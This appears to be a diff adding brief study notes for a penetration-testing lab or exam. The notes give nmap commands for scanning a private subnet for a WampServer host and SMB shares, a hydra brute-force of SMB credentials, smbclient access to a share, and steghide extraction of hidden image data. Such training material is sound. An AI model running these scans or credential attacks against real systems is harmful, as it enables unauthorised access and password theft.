@@ -1,0 +1,29 @@
+xploit Investigation: Investigate a compromised Windows web development environment, scan the network, enumerate services, and find the IP address of a server running WampServer.
+
+nmap -p 80,443 --script=http-enum 192.168.0.0/24
+how to find answer
+(This scans the subnet for HTTP services.
+Identify WampServer:
+Look for signatures or service banners indicating "WampServer".)
+
+*Identify a Machine with SMB Service Enabled and Crack SMB Credentials*
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.0.0/24
+hydra -L userlist.txt -P passlist.txt smb://192.168.0.10
+Replace userlist.txt and passlist.txt with the appropriate username and password files.
+Access SMB Share to Get the File:
+
+smbclient //192.168.0.10/shared -U Henry
+Decrypt the Encoded Secret:
+
+Use the password to decrypt the encoded file (e.g., with openssl or gpg).
+
+ @Forensic Analysis of an Image File for Hidden Data@
+exiftool MyTrip.jpg
+steghide extract -sf MyTrip.jpg
+
+
+
+
+
+
